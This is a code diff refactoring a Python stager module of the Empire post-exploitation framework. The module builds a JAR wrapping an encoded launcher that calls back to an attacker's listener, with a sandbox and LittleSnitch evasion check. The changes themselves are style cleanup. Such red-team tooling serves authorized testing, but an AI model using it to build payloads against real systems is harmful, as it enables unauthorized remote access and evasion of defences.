@@ -2,6 +2,7 @@ from __future__ import print_function
 from builtins import object
 from empire.server.common import helpers
 
+
 class Stager(object):
 
     def __init__(self, mainMenu, params=[]):
@@ -11,7 +12,7 @@ class Stager(object):
 
             'Author': ['@xorrior'],
 
-            'Description': ('Generates a JAR file.'),
+            'Description': 'Generates a JAR file.',
 
             'Comments': [
                 ''
@@ -22,32 +23,34 @@ class Stager(object):
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Listener' : {
-                'Description'   :   'Listener to generate stager for.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Listener': {
+                'Description': 'Listener to generate stager for.',
+                'Required': True,
+                'Value': ''
             },
-            'Language' : {
-                'Description'   :   'Language of the stager to generate.',
-                'Required'      :   True,
-                'Value'         :   'python'
+            'Language': {
+                'Description': 'Language of the stager to generate.',
+                'Required': True,
+                'Value': 'python',
+                'SuggestedValues': ['python'],
+                'Strict': True
             },
-            'SafeChecks' : {
-                'Description'    :  'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
-                'Required'       :  True,
-                'Value'          :  'True',
-                'SuggestedValues':  ['True', 'False'],
-                'Strict'         :  True
+            'SafeChecks': {
+                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
+                'Required': True,
+                'Value': 'True',
+                'SuggestedValues': ['True', 'False'],
+                'Strict': True
             },
-            'OutFile' : {
-                'Description'   :   'File to output duckyscript to.',
-                'Required'      :   True,
-                'Value'         :   '/tmp/out.jar'
-            },       
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'OutFile': {
+                'Description': 'File to output jar to.',
+                'Required': True,
+                'Value': '/tmp/out.jar'
+            },
+            'UserAgent': {
+                'Description': 'User-agent string to use for the staging request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
             }
         }
 
@@ -61,21 +64,21 @@ class Stager(object):
             if option in self.options:
                 self.options[option]['Value'] = value
 
-
     def generate(self):
 
         # extract all of our options
         language = self.options['Language']['Value']
-        listenerName = self.options['Listener']['Value']
-        userAgent = self.options['UserAgent']['Value']
-        SafeChecks = self.options['SafeChecks']['Value']
+        listener_name = self.options['Listener']['Value']
+        user_agent = self.options['UserAgent']['Value']
+        safe_checks = self.options['SafeChecks']['Value']
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=SafeChecks)
-        
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName=listener_name, language=language, encode=True,
+                                                           userAgent=user_agent, safeChecks=safe_checks)
+
         if launcher == "":
             print(helpers.color("[!] Error in launcher command generation."))
             return ""
         else:
-            launcher = launcher.replace('"','\\"')
-            jarBytes = self.mainMenu.stagers.generate_jar(launcherCode=launcher)
-            return jarBytes
+            launcher = launcher.replace('"', '\\"')
+            jar_bytes = self.mainMenu.stagers.generate_jar(launcherCode=launcher)
+            return jar_bytes
